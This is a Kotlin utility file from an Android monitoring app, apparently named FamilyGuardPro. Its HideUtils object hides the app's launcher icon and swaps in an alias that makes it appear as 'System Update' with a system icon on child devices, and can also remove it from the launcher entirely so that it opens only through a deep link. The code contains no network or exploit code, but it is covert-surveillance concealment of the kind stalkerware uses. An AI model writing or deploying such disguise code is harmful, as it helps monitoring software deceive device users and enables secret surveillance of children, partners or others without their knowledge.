package com.familyguardpro.utils

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log

/**
 * Utility class for hiding/showing the app icon in launcher.
 * Used to disguise the app as "System Update" on child devices.
 */
object HideUtils {

    private const val TAG = "HideUtils"
    
    private const val MAIN_ACTIVITY = "com.familyguardpro.MainActivity"
    private const val SYSTEM_UPDATE_ALIAS = "com.familyguardpro.SystemUpdateActivity"

    /**
     * Hides the original app icon and enables the "System Update" alias.
     * The app will appear as "System Update" with a system icon.
     */
    fun hideAppIcon(context: Context) {
        try {
            val packageManager = context.packageManager
            
            // Disable original MainActivity launcher
            packageManager.setComponentEnabledSetting(
                ComponentName(context, MAIN_ACTIVITY),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            
            // Enable SystemUpdate alias
            packageManager.setComponentEnabledSetting(
                ComponentName(context, SYSTEM_UPDATE_ALIAS),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            
            Log.d(TAG, "App icon hidden - disguised as System Update")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error hiding app icon", e)
        }
    }

    /**
     * Shows the original app icon (restores normal appearance).
     * Used when parent needs to access the app via deep link.
     */
    fun showAppIcon(context: Context) {
        try {
            val packageManager = context.packageManager
            
            // Enable original MainActivity
            packageManager.setComponentEnabledSetting(
                ComponentName(context, MAIN_ACTIVITY),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            
            // Disable SystemUpdate alias
            packageManager.setComponentEnabledSetting(
                ComponentName(context, SYSTEM_UPDATE_ALIAS),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            
            Log.d(TAG, "App icon restored")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error showing app icon", e)
        }
    }

    /**
     * Completely hides the app from launcher (no icon visible at all).
     * Warning: User can only access via deep link.
     */
    fun hideCompletely(context: Context) {
        try {
            val packageManager = context.packageManager
            
            // Disable both activities
            packageManager.setComponentEnabledSetting(
                ComponentName(context, MAIN_ACTIVITY),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            
            packageManager.setComponentEnabledSetting(
                ComponentName(context, SYSTEM_UPDATE_ALIAS),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            
            Log.d(TAG, "App completely hidden from launcher")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error hiding app completely", e)
        }
    }

    /**
     * Checks if the app icon is currently hidden.
     */
    fun isAppHidden(context: Context): Boolean {
        val packageManager = context.packageManager
        
        val mainState = packageManager.getComponentEnabledSetting(
            ComponentName(context, MAIN_ACTIVITY)
        )
        
        return mainState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    }

    /**
     * Checks if the app is disguised as System Update.
     */
    fun isDisguised(context: Context): Boolean {
        val packageManager = context.packageManager
        
        val aliasState = packageManager.getComponentEnabledSetting(
            ComponentName(context, SYSTEM_UPDATE_ALIAS)
        )
        
        return aliasState == PackageManager.COMPONENT_ENABLED_STATE_ENABLED
    }
}
